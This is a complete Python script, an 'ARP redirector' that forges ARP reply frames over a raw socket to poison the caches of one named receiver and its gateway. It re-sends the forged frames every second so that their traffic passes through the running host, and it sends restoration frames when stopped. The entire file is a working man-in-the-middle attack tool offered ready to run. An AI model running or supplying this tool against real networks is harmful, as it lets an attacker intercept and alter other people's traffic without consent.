#!/usr/bin/env python3
"""ARP redirector for one verified receiver/gateway pair."""

import argparse
import signal
import socket
import struct
import time


def mac_bytes(value):
    raw = bytes.fromhex(value.replace(":", "").replace("-", ""))
    if len(raw) != 6:
        raise ValueError(f"invalid MAC address: {value}")
    return raw


def ip_bytes(value):
    return socket.inet_aton(value)


def get_iface_mac(ifname):
    with open(f"/sys/class/net/{ifname}/address", encoding="ascii") as handle:
        return mac_bytes(handle.read().strip())


def make_frame(src_mac, src_ip, dst_mac, dst_ip):
    ethernet = dst_mac + src_mac + struct.pack("!H", 0x0806)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
    arp += src_mac + src_ip + dst_mac + dst_ip
    return ethernet + arp


def parse_args():
    parser = argparse.ArgumentParser(
        description="Poison and restore exactly one verified receiver/gateway ARP pair."
    )
    parser.add_argument("interface")
    parser.add_argument("receiver_ip")
    parser.add_argument("receiver_mac")
    parser.add_argument("gateway_ip")
    parser.add_argument("gateway_mac")
    return parser.parse_args()


def main():
    args = parse_args()
    host_mac = get_iface_mac(args.interface)
    receiver_ip = ip_bytes(args.receiver_ip)
    receiver_mac = mac_bytes(args.receiver_mac)
    gateway_ip = ip_bytes(args.gateway_ip)
    gateway_mac = mac_bytes(args.gateway_mac)

    poison_receiver = make_frame(host_mac, gateway_ip, receiver_mac, receiver_ip)
    poison_gateway = make_frame(host_mac, receiver_ip, gateway_mac, gateway_ip)
    restore_receiver = make_frame(gateway_mac, gateway_ip, receiver_mac, receiver_ip)
    restore_gateway = make_frame(receiver_mac, receiver_ip, gateway_mac, gateway_ip)

    running = True

    def request_exit(_signum, _frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, request_exit)
    signal.signal(signal.SIGTERM, request_exit)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((args.interface, 0))
    print(f"[*] ARP redirector active on {args.interface}", flush=True)
    print(
        f"[*] Exact pair: {args.receiver_ip} ({args.receiver_mac}) <-> "
        f"{args.gateway_ip} ({args.gateway_mac}) via {host_mac.hex(':')}",
        flush=True,
    )

    try:
        while running:
            sock.send(poison_receiver)
            sock.send(poison_gateway)
            time.sleep(1.0)
    finally:
        print("[*] Restoring the exact poisoned ARP pair...", flush=True)
        for _ in range(5):
            sock.send(restore_receiver)
            sock.send(restore_gateway)
            time.sleep(0.1)
        sock.close()
        print("[*] Exact ARP-pair restoration frames sent.", flush=True)


if __name__ == "__main__":
    main()
